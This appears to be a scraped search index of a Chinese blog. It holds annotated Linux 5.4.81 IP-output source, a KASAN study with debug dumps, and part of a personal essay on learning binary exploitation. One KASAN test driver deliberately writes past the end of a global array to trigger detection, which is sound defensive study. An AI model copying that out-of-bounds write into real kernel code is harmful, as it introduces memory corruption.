mtu = cork-\u003egso_size ? IP_MAX_MTU : cork-\u003efragsize; paged = !!cork-\u003egso_size; if (cork-\u003etx_flags \u0026 SKBTX_ANY_SW_TSTAMP \u0026\u0026 sk-\u003esk_tsflags \u0026 SOF_TIMESTAMPING_OPT_ID) tskey = sk-\u003esk_tskey++; // 为L2层保留首部长度 hh_len = LL_RESERVED_SPACE(rt-\u003edst.dev); // udp头部 + ip选项 fragheaderlen = sizeof(struct iphdr) + (opt ? opt-\u003eoptlen : 0); // payload部分需要8字节对齐 maxfraglen = ((mtu - fragheaderlen) \u0026 ~7) + fragheaderlen; // 检查是否设置DF标志(动态mtu探测), 没有开启mtu探测可直接传输最大0xffff字节数据 maxnonfragsize = ip_sk_ignore_df(sk) ? 0xFFFF : mtu; // 如果传输数据超过maxnonfragsize, 则报错退出 if (cork-\u003elength + length \u003e maxnonfragsize - fragheaderlen) { ip_local_error(sk, EMSGSIZE, fl4-\u003edaddr, inet-\u003einet_dport, mtu - (opt ? opt-\u003eoptlen : 0)); return -EMSGSIZE; } /* * transhdrlen \u003e 0 means that this is the first fragment and we wish * it won't be fragmented in the future. */ // 发送第一个报文\u0026报文长度小于mtu\u0026存在硬件校验(支持全部包校验or校验ipv4协议中的tcp/udp)\u0026非阻塞IO or开启GSO\u0026没有拓展头部or支持ESP硬件分片, 开启硬件校验 if (transhdrlen \u0026\u0026 length + fragheaderlen \u003c= mtu \u0026\u0026 rt-\u003edst.dev-\u003efeatures \u0026 (NETIF_F_HW_CSUM | NETIF_F_IP_CSUM) \u0026\u0026 (!(flags \u0026 MSG_MORE) || cork-\u003egso_size) \u0026\u0026 (!exthdrlen || (rt-\u003edst.dev-\u003efeatures \u0026 NETIF_F_HW_ESP_TX_CSUM))) csummode = CHECKSUM_PARTIAL; // 零拷贝机制, 可以提升大块数据收发速度 if (flags \u0026 MSG_ZEROCOPY \u0026\u0026 length \u0026\u0026 sock_flag(sk, SOCK_ZEROCOPY)) { uarg = sock_zerocopy_realloc(sk, length, skb_zcopy(skb)); if (!uarg) return -ENOBUFS; extra_uref = !skb_zcopy(skb); /* only ref on new uarg */ if (rt-\u003edst.dev-\u003efeatures \u0026 NETIF_F_SG \u0026\u0026 csummode == CHECKSUM_PARTIAL) { paged = true; } else { uarg-\u003ezerocopy = 0; skb_zcopy_set(skb, uarg, \u0026extra_uref); } } // 更新cork-\u003elength长度, 对于阻塞通信, cork-\u003elength会表示所有已存储数据长度 cork-\u003elength += length; /* So, what's going on in the loop below? * * We use calculated fragment length to generate chained skb, * each of segments is IP fragment ready for sending to network after * adding appropriate IP header. */ // skb为空则新建skb if (!skb) goto alloc_new_skb; while (length \u003e 0) { /* Check if the remaining data fits into current packet. */ // skb-\u003elen表示当前skb已存储数据, copy表示本次循环待处理数据长度 copy = mtu - skb-\u003elen; // 当前skb不能容纳剩余的所有数据 if (copy \u003c length) copy = maxfraglen - skb-\u003elen; // 当前skb已满, 需要分配新的skb if (copy \u003c= 0) { char *data; unsigned int datalen; unsigned int fraglen; unsigned int fraggap; unsigned int alloclen; unsigned int pagedlen; struct sk_buff *skb_prev; alloc_new_skb: skb_prev = skb; // 如果上一个skb存在, 则说明上一个块已经被填满(skb_prev-\u003elen与maxfraglen差值在[0:8)内) // 否则说明当前skb为第一个skb, 无需考虑上一个skb剩余数据 if (skb_prev) fraggap = skb_prev-\u003elen - maxfraglen; else fraggap = 0; /* * If remaining data exceeds the mtu, * we know we need more fragment(s). */ // datalen记录当前skb需要存储的数据大小, 如果数据超出mtu, 按照最大mtu计算(第一个报文片段需要考虑报文头长度) datalen = length + fraggap; if (datalen \u003e mtu - fragheaderlen) datalen = maxfraglen - fragheaderlen; fraglen = datalen + fragheaderlen; pagedlen = 0; // 如果接下来会有数据传入且硬件不支持分散/聚合IO, 则直接分配mtu大小空间, 否则按需分析 if ((flags \u0026 MSG_MORE) \u0026\u0026 !(rt-\u003edst.dev-\u003efeatures\u0026NETIF_F_SG)) alloclen = mtu; else if (!paged) alloclen = fraglen; else { alloclen = min_t(int, fraglen, MAX_HEADER); pagedlen = fraglen - alloclen; } // 添加拓展头空间 alloclen += e","date":"2021-03-21","objectID":"/kernel_net/:4:6","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"4.4 ip_send_skb ip_send_skb-\u003eip_local_out int ip_send_skb(struct net *net, struct sk_buff *skb) { int err; err = ip_local_out(net, skb-\u003esk, skb); if (err) { if (err \u003e 0) // 传递底层错误信息至上层协议 err = net_xmit_errno(err); if (err) IP_INC_STATS(net, IPSTATS_MIB_OUTDISCARDS); } return err; } int ip_local_out(struct net *net, struct sock *sk, struct sk_buff *skb) { int err; // 填充ip头部, 判断数据包是否允许通过 err = __ip_local_out(net, sk, skb); if (likely(err == 1)) // 发送数据包 err = dst_output(net, sk, skb); return err; } ","date":"2021-03-21","objectID":"/kernel_net/:4:7","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"4.4.1 __ip_local_out int __ip_local_out(struct net *net, struct sock *sk, struct sk_buff *skb) { struct iphdr *iph = ip_hdr(skb); // 填充ip报文长度 iph-\u003etot_len = htons(skb-\u003elen); // 计算ip校验和 ip_send_check(iph); /* if egress device is enslaved to an L3 master device pass the * skb to its handler for processing */ // 设置出口设备为l3主设备(虚拟网卡) skb = l3mdev_ip_out(sk, skb); if (unlikely(!skb)) return 0; skb-\u003eprotocol = htons(ETH_P_IP); // 检查此处是否存在网络数据包过滤器, 如果存在则执行过滤操作, 并将dst_output作为回调函数 return nf_hook(NFPROTO_IPV4, NF_INET_LOCAL_OUT, net, sk, skb, NULL, skb_dst(skb)-\u003edev, dst_output); } ","date":"2021-03-21","objectID":"/kernel_net/:4:8","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"发表于安全客 ","date":"2021-03-21","objectID":"/kernel_kasan/:0:0","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":["linux内核源码分析"],"content":"KASAN 简述 KASAN是内核用于动态检测内存错误的工具, 简单来说, 数据区域可分为两种:可访问区域，不可访问区域(red_zone).KASAN存在影子内存(shadow memory), 他和正常内存的比例是1:8, 即1byte shadow memory可以代表8bytes 正常内存的可访问性. 128TB(内核正常内存) : 16TB(影子内存) — Documentation/x86/x86_64/mm.rst x86-64 内存布局显示如下: ffffec0000000000 | -20 TB | fffffbffffffffff | 16 TB | KASAN shadow memory 具体规则(+: byte可访问, -: byte不可访问) 如果1byte shadow memory对应的8bytes 内存都可访问, 则*(shadow memory) == 0 [0] -\u003e [+, +, +, +, +, +, +, +] 如果1byte shadow memory对应的8bytes 内存都不可访问, 则*(shadow memory)为负数 [-1] -\u003e [-, -, -, -, -, -, -, -] 如果1byte shadow memory对应的8bytes 内存中有N bytes可访问, 则*(shadow memory) == N if N = 3 [3] -\u003e [+, +, +, -, -, -, -, -] 实现原理 代码插桩: 利用编译器特性进行代码插桩, 当程序对内存进行读取或写入(load/store)时插入kasan检测代码 kasan检测代码: __asan_loadN(addr)/__asan_storeN(addr) (后面会对源码做详细分析), 主要功能是检测addr所在位置的N bytes内存是否可用. ","date":"2021-03-21","objectID":"/kernel_kasan/:1:0","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":["linux内核源码分析"],"content":"源码分析 ","date":"2021-03-21","objectID":"/kernel_kasan/:2:0","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":["linux内核源码分析"],"content":"kasan检测入口 使用宏定义实现__asan_load/__asan_store, 关键函数为check_memory_region_inline #define DEFINE_ASAN_LOAD_STORE(size) \\ void __asan_load##size(unsigned long addr) \\ { \\ check_memory_region_inline(addr, size, false, _RET_IP_);\\ } \\ EXPORT_SYMBOL(__asan_load##size); \\ __alias(__asan_load##size) \\ void __asan_load##size##_noabort(unsigned long); \\ EXPORT_SYMBOL(__asan_load##size##_noabort); \\ void __asan_store##size(unsigned long addr) \\ { \\ check_memory_region_inline(addr, size, true, _RET_IP_); \\ } \\ EXPORT_SYMBOL(__asan_store##size); \\ __alias(__asan_store##size) \\ void __asan_store##size##_noabort(unsigned long); \\ EXPORT_SYMBOL(__asan_store##size##_noabort) ","date":"2021-03-21","objectID":"/kernel_kasan/:2:1","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":["linux内核源码分析"],"content":"check_memory_region_inline 当size==0时, 对内存不做读写操作, 正常返回 addr必须大于KASAN_SHADOW_START对应的正常地址, 即addr必须在shadow映射的界限内 memory_is_poisoned作为核心函数判断内存是否可用 static __always_inline bool check_memory_region_inline(unsigned long addr, size_t size, bool write, unsigned long ret_ip) { if (unlikely(size == 0)) return true; if (unlikely((void *)addr \u003c kasan_shadow_to_mem((void *)KASAN_SHADOW_START))) { kasan_report(addr, size, write, ret_ip); return false; } if (likely(!memory_is_poisoned(addr, size))) return true; kasan_report(addr, size, write, ret_ip); return false; } ","date":"2021-03-21","objectID":"/kernel_kasan/:2:2","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":["linux内核源码分析"],"content":"memory_is_poisoned size 如果为常量, 则对1, 2-4-8, 16这三种情况分开讨论 size 不为常量进入memory_is_poisoned_n static __always_inline bool memory_is_poisoned(unsigned long addr, size_t size) { // 判断size是否为常量 if (__builtin_constant_p(size)) { switch (size) { case 1: return memory_is_poisoned_1(addr); case 2: case 4: case 8: return memory_is_poisoned_2_4_8(addr, size); case 16: return memory_is_poisoned_16(addr); default: BUILD_BUG(); } } return memory_is_poisoned_n(addr, size); } memory_is_poisoned_1 通过kasan_mem_to_shadow获得addr对应的shadow_addr, *((s8 *)shadow_addr)获得shadow_addr所对应的8bits内存值shadow_value 因为1byte shadow对应8bytes, 所以可以将 8bytes对齐的addr -\u003e 8bytes对齐的addr+8 设为一个内存组, 对应1byte shadow, 此处addr\u00267获得addr在该组中的偏移量last_accessible_byte 比较偏移量与shadow_value(该组内可访问内存的byte 数), 如果last_accessible_byte \u003c= shadow_value 显然addr可访问(当shadow_value==0时, 表示8bytes皆可访问) static __always_inline bool memory_is_poisoned_1(unsigned long addr) { s8 shadow_value = *(s8 *)kasan_mem_to_shadow((void *)addr); if (unlikely(shadow_value)) { s8 last_accessible_byte = addr \u0026 KASAN_SHADOW_MASK; return unlikely(last_accessible_byte \u003e= shadow_value); } return false; } memory_is_poisoned_2_4_8 与memory_is_poisoned_1的区别在于此处多考虑了一种情况(待store/read内存跨越两个内存组) 对于跨越内存组的情况, 需要满足第一个内存组8bytes皆可访问(0), 第二个内存组shadow_value \u003e= 组内偏移 如果不跨越内存, 只判断末尾地址是否可store/load 1byte 内存 static __always_inline bool memory_is_poisoned_2_4_8(unsigned long addr, unsigned long size) { u8 *shadow_addr = (u8 *)kasan_mem_to_shadow((void *)addr); /* * Access crosses 8(shadow size)-byte boundary. Such access maps * into 2 shadow bytes, so we need to check them both. */ if (unlikely(((addr + size - 1) \u0026 KASAN_SHADOW_MASK) \u003c size - 1)) return *shadow_addr || memory_is_poisoned_1(addr + size - 1); return memory_is_poisoned_1(addr + size - 1); } memory_is_poisoned_16 只有addr本身为8bytes 对齐时才会只跨越两个内存组, 否则跨越三个内存组 对于跨越三个内存组的情况, 需要满足前两个内存组内存皆可访问(16bit shadow_value == 0), 同时第三个内存组shadow_value \u003e= 组内偏移 如果只跨越两个内存组, 只需要16bit shadow_value == 0即可 static __always_inline bool memory_is_poisoned_16(unsigned long addr) { u16 *shadow_addr = (u16 *)kasan_mem_to_shadow((void *)addr); /* Unaligned 16-bytes access maps into 3 shadow bytes. */ if (unlikely(!IS_ALIGNED(addr, KASAN_SHADOW_SCALE_SIZE))) return *shadow_addr || memory_is_poisoned_1(addr + 15); return *shadow_addr; } memory_is_poisoned_n memory_is_nonzero: 首先定位与待访问内存块对应的shadow_mem_block, 检测shadow_mem_block中的shadow_value是否全为0, 如果全为0, 则内存块可访问, 从memory_is_poisoned_n返回 如果shadow_value不全为0, 则找到第一个不为0的shadow_value对应的shadow_addr, return shadow_addr 得到memory_is_nonzero中返回的shadow_addr, 如果shadow_addr == last_shadow(末尾地址对应的shadow_addr) 则内存块可访问, 从memory_is_poisoned_n返回 否则判断末尾地址是否可store/load 1byte(比较末尾地址偏移与last_shadow的大小) static __always_inline bool memory_is_poisoned_n(unsigned long addr, size_t size) { unsigned long ret; ret = memory_is_nonzero(kasan_mem_to_shadow((void *)addr), kasan_mem_to_shadow((void *)addr + size - 1) + 1); if (unlikely(ret)) { unsigned long last_byte = addr + size - 1; s8 *last_shadow = (s8 *)kasan_mem_to_shadow((void *)last_byte); if (unlikely(ret != (unsigned long)last_shadow || ((long)(last_byte \u0026 KASAN_SHADOW_MASK) \u003e= *last_shadow))) return true; } return false; } ","date":"2021-03-21","objectID":"/kernel_kasan/:2:3","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":["linux内核源码分析"],"content":"实例分析 ","date":"2021-03-21","objectID":"/kernel_kasan/:3:0","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":["linux内核源码分析"],"content":"buddy_kasan kasan_alloc_pages: 标记shadow_mem为0, kasan_free_pages: 标记shadow_mem为不可访问 验证代码 编写kasan驱动, 使用alloc_pages调用buddy分配内存, 查看分配后以及释放后的shadow_mem内存(local_addr[0] = ‘\\x10’; 对buddy分配的内存块做store操作, 会触发__asan_store1代码插桩) long kasan_ioctl(struct file* filp, unsigned int cmd, unsigned long arg) { char *local_addr = NULL; struct page *local_pg = alloc_pages(GFP_KERNEL, 2); local_addr = page_address(local_pg); local_addr[0] = '\\x10'; __free_pages(local_pg, 2); printk(KERN_DEBUG \"[+] modules kasan debug\\n\"); return 0; } ida反汇编代码(存在_asan_store1_noabort(v5), 猜测成立) __int64 __fastcall kasan_ioctl(file *filp, unsigned int cmd, unsigned __int64 arg) { __int64 v3; // r13 __int64 v4; // r12 _BYTE *v5; // r12 _fentry__(filp, cmd, arg); v3 = alloc_pages_current(3264LL, 2LL); _asan_load8_noabort(\u0026vmemmap_base); v4 = v3 - vmemmap_base; _asan_load8_noabort(\u0026page_offset_base); v5 = (_BYTE *)(page_offset_base + (v4 \u003e\u003e 6 \u003c\u003c 12)); _asan_store1_noabort(v5); *v5 = 0x10; printk(\u0026unk_1C0, v5); _free_pages(v3, 2LL); printk(\u0026unk_200, 2LL); return 0LL; } buddy_kasan 动态调试 在call __asan_store1处下断点, 查看rdi内容 gef➤ p $rdi $1 = 0xffff88805b034000 计算shadow_mem = addr » 3 + 0xdffffc0000000000, 所以0xffff88805b034000对应的shadow_mem: 0xffffed100b606800 static inline void *kasan_mem_to_shadow(const void *addr) { return (void *)((unsigned long)addr \u003e\u003e KASAN_SHADOW_SCALE_SHIFT) + KASAN_SHADOW_OFFSET; } 查看shadow_mem内容(shadow_value=0x0, 表示内存块可访问) gef➤ x/16xg 0xffffed100b606800 0xffffed100b606800: 0x0000000000000000 0x0000000000000000 0xffffed100b606810: 0x0000000000000000 0x0000000000000000 0xffffed100b606820: 0x0000000000000000 0x0000000000000000 0xffffed100b606830: 0x0000000000000000 0x0000000000000000 0xffffed100b606840: 0x0000000000000000 0x0000000000000000 0xffffed100b606850: 0x0000000000000000 0x0000000000000000 0xffffed100b606860: 0x0000000000000000 0x0000000000000000 0xffffed100b606870: 0x0000000000000000 0x0000000000000000 程序执行__free_pages, 释放buddy内存块, 再次查看shadow_mem(0xff=-1, 内存块不可访问) gef➤ x/16xg 0xffffed100b606800 0xffffed100b606800: 0xffffffffffffffff 0xffffffffffffffff 0xffffed100b606810: 0xffffffffffffffff 0xffffffffffffffff 0xffffed100b606820: 0xffffffffffffffff 0xffffffffffffffff 0xffffed100b606830: 0xffffffffffffffff 0xffffffffffffffff 0xffffed100b606840: 0xffffffffffffffff 0xffffffffffffffff 0xffffed100b606850: 0xffffffffffffffff 0xffffffffffffffff 0xffffed100b606860: 0xffffffffffffffff 0xffffffffffffffff 0xffffed100b606870: 0xffffffffffffffff 0xffffffffffffffff 计算shadow_mem边界(mem:shadow_mem=8:1), alloc_pages申请4页(0x1000 * 4)对应shadow_mem(0x1000 * 4/8=0x800), 发现0xff与0xfc的分界, 猜测成立 gef➤ x/16xg 0xffffed100b606800+0x800-0x10 0xffffed100b606ff0: 0xffffffffffffffff 0xffffffffffffffff 0xffffed100b607000: 0xfcfcfcfcfcfcfcfc 0xfcfcfcfcfcfcfcfc 0xffffed100b607010: 0xfcfcfcfcfcfcfcfc 0xfcfcfcfcfcfcfcfc 0xffffed100b607020: 0xfcfcfcfcfcfcfcfc 0xfcfcfcfcfcfcfcfc 0xffffed100b607030: 0xfcfcfcfcfcfcfcfc 0xfcfcfcfcfcfcfcfc 0xffffed100b607040: 0xfcfcfcfcfcfcfcfc 0xfcfcfcfcfcfcfcfc 0xffffed100b607050: 0xfcfcfcfcfcfcfcfc 0xfcfcfcfcfcfcfcfc 0xffffed100b607060: 0xfcfcfcfcfcfcfcfc 0xfcfcfcfcfcfcfcfc 由上述调试结果可知, buddy_kasan可有效的检测内存越界以及uaf ","date":"2021-03-21","objectID":"/kernel_kasan/:3:1","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":["linux内核源码分析"],"content":"slub_kasan 提到slub_kasan不得不提及slub_debug, slub_debug是slub早期的内存检测机制, 想详细的了解可以看一下这篇文章 slub_debug原理, 或者我之前写的一篇文章点击此处 在这里我简单的描述一下slub_debug的原理: 首先slub算法将page切割成一个一个的slub_obj, obj的布局大概是当obj空闲时, 复用头部空间用于存储free_list(指向下一个空闲obj) 当slub_debug开启后, slub_obj的布局将发生非常大的改变如下, 第一行为初始布局, 第二行为开启slub_debug后的布局 图中red_zone为右边界越界检测, red_left_pad为左边界越界检测, 这里对于red_left_pad着重说一下, 如果从第二幅图来看, 怎么也看不出左边界越界检测原理, 但是如果布局是第三幅图的话, 就非常明了了. 所以重点在于第二幅布局如何变成第三幅布局, slub的实现是, 每个obj在设计时仍然采用第二副布局, 但却在page开头开辟了一个red_left_pad, 这样就巧妙的完成了转换(至于为什么要经过这么一番转换, 只能说是历史遗留问题, 设计右边界越界检测时并没有考虑左边界越界) 然后再说一下slub_debug的局限性, slub_debug虽然和kasan一样设计了red_zone但是, slub_debug的安全检测只在alloc/free时启动, 即如果一个越界内存块永远不被释放, 则安全漏洞很难被发现(为了解决这个问题, slub设计了slub_info可以主动的去触发安全检测, 但是和kasan相比, 在检测范围上仍然很局限 — 只能检测slub内存问题, 同时还有一个非常重要的问题, slub_debug的red_zone是和填充数据位于同一内存块, 是可以被修改的, 有被劫持的风险) 关于slub_debug就说这么多, 继续研究slub_kasan(slub_kasan的布局在slub_debug上面再加一个) slub_debug kasan_poison_slab: 当创建kmem_cache时将page对应的shadow_mem标记为KASAN_KMALLOC_REDZONE, 表示内存不可访问 void kasan_poison_slab(struct page *page) { unsigned long i; for (i = 0; i \u003c compound_nr(page); i++) page_kasan_tag_reset(page + i); kasan_poison_shadow(page_address(page), page_size(page), KASAN_KMALLOC_REDZONE); } __kasan_kmalloc: 当使用kmalloc(x) 申请内存后, 有一部分内存可用, 填充red_zone, 修改shadow_mem(__kasan_kmalloc和下面全局变量修改shadow_mem的原理类似, 可以滑到下面看看全局变量_kasan, 大致思路就是填充从obj_start+size到obj末尾内存为red_zone) ","date":"2021-03-21","objectID":"/kernel_kasan/:3:2","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":["linux内核源码分析"],"content":"全局变量_kasan __asan_register_globals: 根据 struct kasan_global为全局变量填充shadow_mem, __asan_unregister_globals实现为空 验证代码 目标全局变量为global_var char global_var[34] = {'a', 'b', 'c', 'd'}; long kasan_ioctl(struct file* filp, unsigned int cmd, unsigned long arg) { global_var[0] = 'x'; global_var[34] = '*'; return 0; } ida反汇编代码 __int64 __fastcall kasan_ioctl(file *filp, unsigned int cmd, unsigned __int64 arg) { __int64 result; // rax _fentry__(filp, cmd, arg); global_var[0] = 120; _asan_store1_noabort(\u0026global_var[34]); result = 0LL; global_var[34] = 42; return result; } 全局变量 动态调试 查看global_var内存(0xffffffffc000a000)与其对应的shadow_mem(0xfffffbfff8001400)发现, global_var存在34 bytes有效内存, 62 bytes为无效内存(red_zone) gef➤ disassemble Dump of assembler code for function kasan_ioctl: =\u003e 0xffffffffc0008000 \u003c+0\u003e: data16 data16 data16 xchg ax,ax 0xffffffffc0008005 \u003c+5\u003e: push rbp 0xffffffffc0008006 \u003c+6\u003e: mov rdi,0xffffffffc000a022 0xffffffffc000800d \u003c+13\u003e: mov BYTE PTR [rip+0x1fec],0x78 # 0xffffffffc000a000 0xffffffffc0008014 \u003c+20\u003e: mov rbp,rsp 0xffffffffc0008017 \u003c+23\u003e: call 0xffffffff8145d790 \u003c__asan_store1\u003e 0xffffffffc000801c \u003c+28\u003e: xor eax,eax 0xffffffffc000801e \u003c+30\u003e: mov BYTE PTR [rip+0x1ffd],0x2a # 0xffffffffc000a022 0xffffffffc0008025 \u003c+37\u003e: pop rbp 0xffffffffc0008026 \u003c+38\u003e: ret End of assembler dump. gef➤ x/2xg 0xffffffffc000a000 0xffffffffc000a000: 0x0000000064636261 0x0000000000000000 gef➤ x/2xg 0xfffffbfff8001400 0xfffffbfff8001400: 0xfafafa0200000000 0x00000000fafafafa gef➤ 进一步验证red_zone原理(ida显示驱动init_array段中存在指向__asan_register_globals的函数指针, 显然在驱动初始化阶段会调用该函数) 分析__asan_register_globals源码发现一个用来修饰全局变量的结构体(存放于.data段), 结合ida反汇编结果后填充结构体如下: struct kasan_global { const void *beg=0xffffffffc000a000; /* Address of the beginning of the global variable. */ size_t size=0x22; /* Size of the global variable. */ size_t size_with_redzone=0x60; /* Size of the variable + size of the red zone. 32 bytes aligned */ const void *name=\"global_var\"; const void *module_name=\"/home/povcfe/code/modules/kasan/kasan.c\"; /* Name of the module where the global variable is declared. */ unsigned long has_dynamic_init=0; /* This needed for C++ */ #if KASAN_ABI_VERSION \u003e= 4 struct kasan_source_location *location; #endif #if KASAN_ABI_VERSION \u003e= 5 char *odr_indicator=\"/home/povcfe/code/modules/kasan/kasan.c\"; #endif }; size_with_redzone=0x60, 动调时发现redzone为62(0x3e) bytes, 显然此处size_with_redzone不可能被直接使用, 继续分析源码 __asan_register_globals-\u003eregister_global(特别关注aligned_size, 这里会解决上诉问题) static void register_global(struct kasan_global *global) { size_t aligned_size = round_up(global-\u003esize, KASAN_SHADOW_SCALE_SIZE); // 设置有效内存对应的shadow_mem, 特别注意内存组内有效N byte不足8 bytes时, 需要设置shadow_value=N kasan_unpoison_shadow(global-\u003ebeg, global-\u003esize); // 填充8 bytes对齐的redzone对应的shadow_mem为KASAN_GLOBAL_REDZONE kasan_poison_shadow(global-\u003ebeg + aligned_size, global-\u003esize_with_redzone - aligned_size, KASAN_GLOBAL_REDZONE); } aligned_size #define __round_mask(x, y) ((__typeof__(x))((y)-1)) #define round_up(x, y) ((((x)-1) | __round_mask(x, y))+1) 算数太差, 直接用c实现了一下, aligned_size=0x28 #include \u003cstdio.h\u003e size_t __round_mask(size_t x, size_t y) { return ((__typeof__(x))((y)-1)); } size_t round_up(size_t x, size_t y) { return ((((x)-1) | __round_mask(x, y))+1); } int main() { size_t res = round_up(0x22, 7); printf(\"0x%lx\", res); } 故 global-\u003esize_with_redzone(0x60) = 0x28(0x22(size) + 0x6(red_zone)) + 0x38(red_zone), 即有效内存空间0x22 bytes, red_zone(0x6 + 0x38) bytes ","date":"2021-03-21","objectID":"/kernel_kasan/:3:3","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":["linux内核源码分析"],"content":"栈变量_kasan __kasan_unpoison_stack: 设置栈内有效内存shadow_mem 验证代码 目标栈变量 stack_var long kasan_ioctl(struct file* filp, unsigned int cmd, unsigned long arg) { char stack_var[0x4] = {'a', 'b', 'c', 'd'}; stack_var[0x0] = 'x'; printk(KERN_DEBUG \"[+] %s\\n\", stack_var); return 0; } ida反汇编代码(注意到0xF1(KASAN_STACK_LEFT), 0xF3(KASAN_STACK_RIGHT)字段, 猜测stack_kasan的shadow_mem填充代码是直接通过编译器插入源代码中的) __int64 __fastcall kasan_ioctl(file *filp, unsigned int cmd, unsigned __int64 arg) { _DWORD *v3; // rbx _QWORD v5[4]; // [rsp-70h] [rbp-70h] BYREF int v6; // [rsp-50h] [rbp-50h] BYREF unsigned __int64 v7; // [rsp-18h] [rbp-18h] _fentry__(filp, cmd, arg); v3 = (_DWORD *)(((unsigned __int64)v5 \u003e\u003e 3) - 0x2000040000000000LL); v5[0] = 1102416563LL; v5[1] = \"1 32 4 12 stack_var:15\"; v5[2] = kasan_ioctl; *v3 = 0xF1F1F1F1; v3[1] = 0xF3F3F304; v7 = __readgsqword(0x28u); v6 = 0x64636278; printk(\u0026unk_220, \u0026v6); *(_QWORD *)v3 = 0LL; return 0LL; } 栈变量 动态调试 根据ida反汇编代码猜测栈变量存在左右边界(red_zone)且关于32 bytes对齐 stack_var(0xffff88805b02fcf0)与其shadow_mem(0xffffed100b605f9e)内容如下, 可知栈变量有效内存为4 bytes, red_zone_size: (8 * 3 + 8 - 4) + 8 * 3 = 52(左边界red_zone为32bytes, 右边界red_zone+size关于32 bytes对齐, 总red_zone大小与全局变量相同) gef➤ x/8xg 0xffff88805b02fcf0-0x20 0xffff88805b02fcd0: 0x0000000041b58ab3 0xffffffffc000903c 0xffff88805b02fce0: 0xffffffffc00080e1 0xffff88805e404500 0xffff88805b02fcf0: 0xffff888064636261 0x0000000200000101 0xffff88805b02fd00: 0x000000000000004c 0x0000000000000000 gef➤ x/4xg 0xffffed100b605f9e-0x10 0xffffed100b605f8e: 0x0000000000000000 0xf1f1f1f100000000 0xffffed100b605f9e: 0x00000000f3f3f304 0x0000000000000000 gef➤ 待函数返回(栈变量销毁时), 会将shadow_mem置0(见ida伪代码) *(_QWORD *)v3 = 0LL; 在kasan源码中没有找到填充red_zone的代码, 且栈变量左边界red_zone对应的内存处存放了栈变量信息, 函数信息. 所以猜测栈变量填充red_zone是在编译阶段实现的, 且左边界填充内容为用于描述栈的结构体 ","date":"2021-03-21","objectID":"/kernel_kasan/:3:4","tags":["linux kernel","源码分析","安全机制"],"title":"linux内核(5.4.81)---KASAN","uri":"/kernel_kasan/"},{"categories":null,"content":" 一些思考, 转眼间, 入坑安全已经两年, 一些心得 ","date":"2021-01-27","objectID":"/reprint/:0:0","tags":null,"title":"一些思考","uri":"/reprint/"},{"categories":null,"content":"2017-2018学年(大一) 2017年进入大学, 学习土木工程专业, 如果没有后面不知缘由的对计算机的热爱, 或许我现在正在朝着桥梁设计建造工程师这个方向迈进 大一的时候喜欢看大国工匠, 内心热血, 总想做些什么, 却发现自己什么都做不了 在通识课上, 第一次接触c语言, 由此写出了人生中的第一行hello world 奇怪的是, 我并没有想着要用c语言去完成什么高大上的项目, 自己告诉自己, 我只是想知道为什么hello world可以被输出 那几个月天天抱着一本厚厚的c语言去研究, 这也算是我的计算机启蒙了吧 但是我还是不知道为什么hello world可以被输出? 再后来对这个问题答案的渴求促使我转专业(即使降级也要转专业), 我不想和这个问题擦肩而过(或许那个时候, 如果有人可以和我说懂这个问题, 我就可以在土木安心呆着了呢 =.=) 接下来就是准备转专业, 开始转专业, 降级转网安成功(顺便遇到了我可爱的女朋友 \u003e。\u003c) ","date":"2021-01-27","objectID":"/reprint/:1:0","tags":null,"title":"一些思考","uri":"/reprint/"},{"categories":null,"content":"2018-2019学年(还是大一) 带着2017年的问题, 我进入网安, 接触了二进制, 我坚信学习这个方向可以解决我的疑惑 于是2018年的那个秋天, 捧着汇编, 程序员的自我修养度日, 三个月后颤颤巍巍的拿到第一个栈溢出shell, 似懂非懂, 浑浑噩噩, 有拿到shell的喜悦, 但疑惑加深了, 我还是没有解决我的问题, 仿佛陷入死胡同, 而且三个月才学会第一个栈溢出, 这很明显是傻子行为 不是很服气, 于是二刷程序员的自我修养, 这一次好像懂了些什么(elf文件结构, 动态链接, 静态链接, 堆栈布局), 又好像什么都不懂, 总感觉有些东西没有抓住(另外出现了一个新的问题: 进程与进程之间的内存为什么不会产生冲突, 明明汇编会访问相同的地址) 带着疑问, 继续学习栈溢出, 利用技巧花里胡哨, 简直是神仙打架, 遇到问题, 解决问题, 解决不了问题, 自闭几天, 再去解决问题, 磕磕绊绊的也算是把利用技巧全部复现了一遍 赌气似的三刷程序员的自我修养, 很明显这次我懂了更多的东西, 于是回过头整理了一遍栈溢出, 这次出奇的顺利, 没有任何阻碍, 我想或许这段时间我确实进步了 格式化字符串顺利的学完 堆溢出, 不得不说, 我的基础能力菜的出奇, 一个chunk结构体, 一个fastbin单链表以我当时的能力确实看不懂 自闭数星期 再次学习堆溢出, 还是劝退 自闭数星期 耐着性子, 掠过基础知识, 直接接触fastbin attack利用, 云里雾里不知所云, 但按照模式还是可以勉强做题的, 但我想, 这不是我想要的, 我并不是为了做题才选择二进制, 我是为了学习更多的原理, 乃至于到最后解决我的疑惑才选择的二进制 下了很大的决心之后, 决定看ptmalloc源码, 一行一行看, 